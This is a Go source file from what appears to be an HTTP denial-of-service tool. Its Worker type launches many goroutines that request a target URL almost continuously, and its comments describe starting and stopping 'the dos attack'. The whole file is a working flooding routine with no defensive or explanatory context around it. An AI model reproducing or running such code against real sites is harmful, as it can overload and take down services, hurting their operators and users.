package core

import (
	"fmt"
	"net/http"
	"time"
)

// NewWorker creats a new worker assigning a unique Channel and ID
func (w *Worker) NewWorker() {
	w.Channel = make(chan bool)
	w.ID = time.Now().Unix()
}

// StartWorker starts the dos attack
func (w *Worker) StartWorker(i *Info, numberOfRequests int, url string) {
	go w.attack(i, numberOfRequests, url)
}

// StopWorker stops the attack by closing all channels
func (w *Worker) StopWorker() {
	close(w.Channel)
}

func (w *Worker) attack(info *Info, numberOfRequests int, url string) {
	for i := 0; i < numberOfRequests; i++ {
		go w.request(info, url)
	}
	for {
		select {
		case <-w.Channel:
			fmt.Println("Worker Stopped: ", w.ID)
			return
		default:
			time.Sleep(time.Millisecond * 10)
		}
	}
}

func (w *Worker) request(i *Info, url string) {
	for {
		start := time.Now()
		resp, e := http.Get(url)
		if e == nil {
			secs := time.Since(start).Seconds()
			fmt.Println(secs)
		}

		i.Requests++

		if e != nil {
			i.NetworkFailed++
		} else {
			if resp.StatusCode == http.StatusOK {
				i.Success++
			} else {
				i.BadFailed++
			}
		}

		if w.frequency(1) {
			return
		}
	}
}

func (w *Worker) frequency(wait time.Duration) bool {
	select {
	case <-w.Channel:
		return true
	default:
		time.Sleep(wait * time.Millisecond)
		return false
	}
}
